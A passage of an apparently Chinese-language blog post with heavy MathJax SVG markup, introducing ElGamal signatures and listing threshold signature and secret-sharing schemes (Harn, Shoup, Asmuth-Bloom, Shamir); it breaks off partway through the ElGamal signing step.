    <content><![CDATA[<p>Elgamal 签名算法 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> Harn 的门限签名方案</p>
<p>RSA <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> Shoup 门限签名方案</p>
<p>Asmuth-Bloom 法</p>
<p>Karnin-Greene-Hellman 法</p>
<p>Shamir 门限法（拉格朗日插值法）</p>
<span id="more"></span>
<h1 id="Elgamal-签名算法"><a href="#Elgamal-签名算法" class="headerlink" title="Elgamal 签名算法"></a>Elgamal 签名算法</h1><p>依赖有限域上的离散指数的难计算性，即设<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="1.079ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 477 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g></g></g></svg></mjx-container>为素数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="1.138ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 503 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>的模循环群的原根，对任意的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex" xmlns="http://www.w3.org/2000/svg" width="1.197ex" height="1.02ex" role="img" focusable="false" viewBox="0 -441 529 451"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container>，计算：</p>
<script type="math/tex; mode=display">b=g^a\bmod p</script><p>是容易的（通过幂取模算法）。反过来，给定<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 429 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>计算满足上式的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex" xmlns="http://www.w3.org/2000/svg" width="1.197ex" height="1.02ex" role="img" focusable="false" viewBox="0 -441 529 451"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container>是非常困难的，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex" xmlns="http://www.w3.org/2000/svg" width="1.197ex" height="1.02ex" role="img" focusable="false" viewBox="0 -441 529 451"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container>称为以<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="1.079ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 477 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g></g></g></svg></mjx-container>为基<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 429 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>的离散对数。</p>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>Alice随机选择大素数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="1.138ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 503 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.131ex" height="1.507ex" role="img" focusable="false" viewBox="0 -666 500 666"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="1.138ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 503 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>之间的整数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container>，找出有限域<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.65ex" xmlns="http://www.w3.org/2000/svg" width="2.463ex" height="2.195ex" role="img" focusable="false" viewBox="0 -683 1088.7 970.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(683, -150) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></g></svg></mjx-container>的一个生成元<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="1.079ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 477 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g></g></g></svg></mjx-container>，计算：</p>
<script type="math/tex; mode=display">y=g^x\bmod p</script><p>则公钥为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>，私钥为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container>。</p>
<h2 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h2><p>设待签名消息为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 878 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>，Alice随机选择整数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.179ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 521 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g></svg></mjx-container>，满足<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="5.334ex" height="2.009ex" role="img" focusable="false" viewBox="0 -694 2357.6 888"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(798.8, 0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mi" transform="translate(1854.6, 0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="16.363ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7232.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(477, 0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(910, 0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(1430, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1819, 0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(2340, 0)"><path 